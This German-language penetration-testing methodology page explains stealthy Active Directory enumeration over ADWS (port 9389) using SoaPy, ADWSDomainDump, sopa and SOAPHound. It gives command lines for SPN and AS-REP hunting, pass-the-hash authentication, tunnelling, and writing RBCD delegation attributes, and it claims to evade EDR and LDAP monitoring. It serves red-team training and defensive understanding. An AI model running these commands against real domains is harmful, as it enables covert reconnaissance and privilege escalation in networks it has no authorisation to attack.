# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **standardmäßig auf jedem Domain Controller seit Windows Server 2008 R2 aktiviert** und lauscht auf TCP **9389**. Trotz des Namens ist **kein HTTP involviert**. Stattdessen stellt der Dienst LDAP-artige Daten über einen Stapel proprietärer .NET-Framing-Protokolle bereit:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Verkehr in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port läuft, ist **Enumerierung über ADWS deutlich weniger wahrscheinlich, dass sie inspiziert, gefiltert oder signatured wird als klassischer LDAP/389 & 636-Verkehr**. Für Operatoren bedeutet das:

* Tarnendere recon – Blue teams konzentrieren sich oft auf LDAP-Abfragen.
* Möglichkeit, von **non-Windows hosts (Linux, macOS)** zu sammeln, indem 9389/TCP durch einen SOCKS-Proxy getunnelt wird.
* Dieselben Daten, die man über LDAP erhalten würde (Benutzer, Gruppen, ACLs, Schema, usw.) und die Fähigkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/Attribute definiert und einen `EnumerationContext`-GUID zurückgibt, gefolgt von einer oder mehreren `Pull`-Nachrichten, die bis zum serverdefinierten Ergebnisfenster streamen. Kontexte laufen nach ~30 Minuten ab, daher muss Tooling entweder Ergebnisse paginieren oder Filter aufteilen (Präfix-Abfragen pro CN), um Zustandsverlust zu vermeiden. Wenn Sicherheitsdeskriptoren abgefragt werden, geben Sie die `LDAP_SERVER_SD_FLAGS_OID`-Control an, um SACLs auszuschließen; andernfalls lässt ADWS das Attribut `nTSecurityDescriptor` einfach aus seiner SOAP-Antwort weg.

> HINWEIS: ADWS wird auch von vielen RSAT GUI/PowerShell-Tools genutzt, sodass der Traffic mit legitimer Admin-Aktivität verschmelzen kann.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstapels in reinem Python**. Es erstellt die NBFX/NBFSE/NNS/NMF-Frames Byte-für-Byte und erlaubt die Sammlung von Unix-ähnlichen Systemen, ohne die .NET-Runtime zu berühren.

### Hauptmerkmale

* Unterstützt **Proxying durch SOCKS** (nützlich für C2 implants).
* Feingranulare Suchfilter identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Schreiboperationen** (`--set` / `--delete`).
* **BOFHound output mode** für direkte Einspeisung in BloodHound.
* `--parse`-Flag zur Aufbereitung von Zeitstempeln / `userAccountControl`, wenn menschliche Lesbarkeit gewünscht ist.

### Gezielte Sammel-Flags & Schreiboperationen

SoaPy wird mit kuratierten Schaltern ausgeliefert, die die gängigsten LDAP-Hunting-Aufgaben über ADWS nachbilden: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rohe `--query` / `--filter`-Schalter für benutzerdefinierte Abfragen. Kombinieren Sie diese mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (Schalten von `DONT_REQ_PREAUTH` in `userAccountControl`).

Beispiel einer gezielten SPN-Suche, die nur `samAccountName` und `servicePrincipalName` zurückgibt:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwende denselben Host und dieselben Zugangsdaten, um die Ergebnisse sofort zu verwerten: dump RBCD-capable objects mit `--rbcds`, und wende dann `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation chain aufzubauen (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen Missbrauchspfad).

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump über ADWS (Linux/Windows)

* Fork von `ldapdomaindump`, der LDAP-Abfragen durch ADWS-Aufrufe auf TCP/9389 austauscht, um LDAP-signature hits zu reduzieren.
* Führt eine anfängliche Erreichbarkeitsprüfung zu 9389 durch, es sei denn, `--force` wird übergeben (überspringt die Probe, wenn port scans noisy/filtered sind).
* Getestet gegen Microsoft Defender for Endpoint und CrowdStrike Falcon mit erfolgreichem bypass in der README.

### Installation
```bash
pipx install .
```
### Verwendung
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typische Ausgabe protokolliert die 9389 reachability check, ADWS bind und dump start/finish:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ein praktischer Client für ADWS in Golang

Ähnlich wie soapy, [sopa](https://github.com/Macmod/sopa) implementiert den ADWS-Protokollstack (MS-NNS + MC-NMF + SOAP) in Golang und stellt Kommandozeilen-Flags bereit, um ADWS-Aufrufe auszuführen, wie zum Beispiel:

* **Objektsuche & -abruf** - `query` / `get`
* **Objektlebenszyklus** - `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** - `attr [add|replace|delete]`
* **Kontoverwaltung** - `set-password` / `change-password`
* und andere, z. B. `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, usw.

### Wichtige Punkte zur Protokollzuordnung

* LDAP-ähnliche Abfragen werden über **WS-Enumeration** (`Enumerate` + `Pull`) ausgeführt, mit Attributprojektion, Umfangskontrolle (Base/OneLevel/Subtree) und Paginierung.
* Der Einzelobjekt-Abruf verwendet **WS-Transfer** `Get`; Attributänderungen verwenden `Put`; Löschungen verwenden `Delete`.
* Die eingebaute Objekterstellung verwendet **WS-Transfer ResourceFactory**; benutzerdefinierte Objekte verwenden eine **IMDA AddRequest**, gesteuert durch YAML-Templates.
* Passwortoperationen sind **MS-ADCAP**-Aktionen (`SetPassword`, `ChangePassword`).

### Unauthentifizierte Metadatenerkennung (mex)

ADWS stellt WS-MetadataExchange ohne Anmeldeinformationen bereit, was eine schnelle Möglichkeit ist, die Offenlegung zu überprüfen, bevor man sich authentifiziert:
```bash
sopa mex --dc <DC>
```
### DNS/DC-Erkennung & Kerberos-Targeting-Hinweise

Sopa kann DCs via SRV auflösen, wenn `--dc` weggelassen wird und `--domain` angegeben ist. Es fragt in dieser Reihenfolge ab und verwendet das Ziel mit der höchsten Priorität:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operativ sollte ein DC-gesteuerter Resolver bevorzugt werden, um Ausfälle in segmentierten Umgebungen zu vermeiden:

* Verwende `--dns <DC-IP>`, damit **alle** SRV/PTR/forward-Lookups über den DC DNS laufen.
* Verwende `--dns-tcp`, wenn UDP blockiert ist oder SRV-Antworten groß sind.
* Wenn Kerberos aktiviert ist und `--dc` eine IP ist, führt sopa einen **reverse PTR** aus, um einen FQDN für korrektes SPN/KDC-Targeting zu erhalten. Wird Kerberos nicht verwendet, findet kein PTR-Lookup statt.

Beispiel (IP + Kerberos, erzwungener DNS über den DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Optionen für Auth-Material

Zusätzlich zu Klartext-Passwörtern unterstützt sopa **NT hashes**, **Kerberos AES keys**, **ccache** und **PKINIT certificates** (PFX oder PEM) für ADWS auth. Kerberos ist impliziert, wenn `--aes-key`, `-c` (ccache) oder zertifikatbasierte Optionen verwendet werden.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Benutzerdefinierte Objekterstellung über Vorlagen

Für beliebige Objektklassen liest der `create custom`-Befehl eine YAML-Vorlage ein, die auf eine IMDA `AddRequest` abgebildet ist:

* `parentDN` und `rdn` definieren den Container und die relative DN.
* `attributes[].name` unterstützt `cn` oder den namespaced `addata:cn`.
* `attributes[].type` akzeptiert `string|int|bool|base64|hex` oder explizite `xsd:*`.
* Fügen Sie **nicht** `ad:relativeDistinguishedName` oder `ad:container-hierarchy-parent` hinzu; sopa injiziert diese.
* `hex`-Werte werden in `xsd:base64Binary` konvertiert; verwenden Sie `value: ""`, um leere Strings zu setzen.

## SOAPHound – Hochvolumige ADWS-Sammlung (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und BloodHound v4-kompatibles JSON ausgibt. Er erstellt einmalig einen vollständigen Cache von `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` (`--buildcache`) und verwendet diesen dann für hochvolumige `--bhdump`, `--certdump` (ADCS) oder `--dnsdump` (AD-integrierter DNS) Durchläufe, sodass nur etwa ~35 kritische Attribute den DC verlassen. AutoSplit (`--autosplit --threshold <N>`) partitioniert Anfragen automatisch nach CN-Präfix, um in großen Forests unter dem 30-Minuten EnumerationContext-Timeout zu bleiben.

Typischer Workflow auf einer an die Domain angebundenen Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportierte JSON-Slots direkt in SharpHound/BloodHound-Workflows einfügen—siehe [BloodHound methodology](bloodhound.md) für Ideen zur nachgelagerten Graphdarstellung. AutoSplit macht SOAPHound in Umgebungen mit mehreren Millionen Objekten resilient und hält dabei die Anzahl der Abfragen niedriger als ADExplorer-ähnliche Snapshots.

## Stealth AD-Erfassungs-Workflow

Der folgende Workflow zeigt, wie man über ADWS Domain- & ADCS-Objekte auflistet, sie in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffswegen sucht – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deinem Rechner (z. B. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Setze `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Sammle das Root-Domänenobjekt:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sammle ADCS-bezogene Objekte aus dem Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Lade das ZIP hoch** in der BloodHound GUI und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikat-Eskalationspfade (ESC1, ESC8, etc.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling-Zusammenfassung

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lesen/schreiben |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS-Modi |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy/ldapsearch-Logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy weitergeleitet werden |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generischer Client zur Schnittstelle mit bekannten ADWS-Endpunkten - erlaubt Enumeration, Objekterstellung, Attributänderungen und Passwortänderungen |

## Quellen

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
